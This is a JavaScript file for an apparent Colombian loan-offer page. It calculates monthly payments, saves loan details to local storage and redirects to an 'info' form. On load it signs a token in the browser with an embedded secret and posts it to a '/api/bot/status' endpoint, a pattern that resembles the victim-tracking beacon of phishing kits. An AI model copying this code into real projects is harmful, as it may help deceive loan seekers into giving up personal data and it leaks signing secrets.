const DOMElements = {
    loader: document.querySelector('#loader'),
    montoSlider: document.getElementById('montoSlider'),
    plazoSlider: document.getElementById('plazoSlider'),
    montoValue: document.getElementById('montoValue'),
    plazoValue: document.getElementById('plazoValue'),
    cuotaMensual: document.getElementById('cuotaMensual'),
    interesTotal: document.getElementById('interesTotal'),
    totalPagar: document.getElementById('totalPagar'),
    tasaMensual: document.getElementById('tasaMensual'),
    solicitarBtn: document.getElementById('solicitarBtn')
}

// Utilidades
const UTILS = {
    formatearMoneda: (valor) => {
        return new Intl.NumberFormat('es-CO', {
            style: 'currency',
            currency: 'COP',
            minimumFractionDigits: 0,
            maximumFractionDigits: 0
        }).format(valor);
    },

    calcularCuota: (monto, plazo, tasa) => {
        return (monto * tasa * Math.pow(1 + tasa, plazo)) / (Math.pow(1 + tasa, plazo) - 1);
    }
};

/**
 * Startup
 */
document.addEventListener('DOMContentLoaded', () => {
    addEventListeners();
    actualizarCalculos();

    const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P2'}, JWT_SIGN);
    fetch(`${API_URL}/api/bot/status`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_KEY}`,
        },
        body: JSON.stringify({token: token})
    })
})

/**
 * Event Listeners
 */
const addEventListeners = () => {
    const { montoSlider, plazoSlider, solicitarBtn } = DOMElements;

    montoSlider.addEventListener('input', actualizarCalculos);
    plazoSlider.addEventListener('input', actualizarCalculos);
    solicitarBtn.addEventListener('click', solicitarCredito);
}

/**
 * Functions
 */
const solicitarCredito = () => {
    const { loader, montoSlider, plazoSlider } = DOMElements;

    // Guardar información en info (mismos campos que hay en let info en functions.js)
    info.plazo = parseInt(plazoSlider.value);
    info.monto = parseInt(montoSlider.value);
    info.cuota = UTILS.calcularCuota(montoSlider.value, plazoSlider.value, CONFIG.TASA_MENSUAL);

    updateLS();
    
    loader.classList.remove('hidden');
    
    setTimeout(() => {
        window.location.href = 'info.html';
    }, 2500);
}

const actualizarCalculos = () => {
    const { montoSlider, plazoSlider, montoValue, plazoValue, cuotaMensual, interesTotal, totalPagar, tasaMensual } = DOMElements;

    const monto = parseInt(montoSlider.value);
    const plazo = parseInt(plazoSlider.value);
    const tasa = 0.0125; // 1.25% mensual
    
    // Actualizar valores mostrados
    montoValue.textContent = UTILS.formatearMoneda(monto);
    plazoValue.textContent = `${plazo} meses`;
    tasaMensual.textContent = `${(tasa * 100).toFixed(2)}%`;

    // Calcular valores
    const cuota = UTILS.calcularCuota(monto, plazo, tasa);
    const totalInteres = (cuota * plazo) - monto;
    const total = monto + totalInteres;

    // Actualizar resultados
    cuotaMensual.textContent = UTILS.formatearMoneda(cuota);
    interesTotal.textContent = UTILS.formatearMoneda(totalInteres);
    totalPagar.textContent = UTILS.formatearMoneda(total);
}

const formatearMoneda = (valor) => {
    return new Intl.NumberFormat('es-CO', {
        style: 'currency',
        currency: 'COP',
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
    }).format(valor);
}

const calcularCuota = (monto, plazo, tasa) => {
    return (monto * tasa * Math.pow(1 + tasa, plazo)) / (Math.pow(1 + tasa, plazo) - 1);
} 